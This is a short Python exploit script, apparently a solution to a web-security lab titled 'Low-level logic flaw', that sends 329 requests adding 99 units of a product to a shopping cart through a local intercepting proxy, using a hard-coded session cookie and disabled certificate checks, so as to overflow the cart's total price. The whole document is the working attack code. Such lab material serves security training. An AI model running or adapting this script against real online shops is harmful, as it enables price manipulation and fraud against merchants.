'''
Low-level logic flaw
'''
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http":"https://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

def add2cart(url):
    path = 'cart'
    cookie ={'session':'QOuQods7ZIxRjWzTdcqkKpuQoDUbEEZN'}
    params = {'productId':'1','redir':'PRODUCT','quantity':'99'}
    for i in range(1,330):
        sys.stdout.write(f'-{i}')
        sys.stdout.flush()
        r = requests.post(url + path, data = params, verify=False, proxies=proxies,cookies=cookie)
       
def main():
    if len(sys.argv) != 2:
        print ("(+) Usage: %s <url> " % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print ("(+) adding 99 jacket to cart")
    add2cart(url)

if __name__ == "__main__":
    main()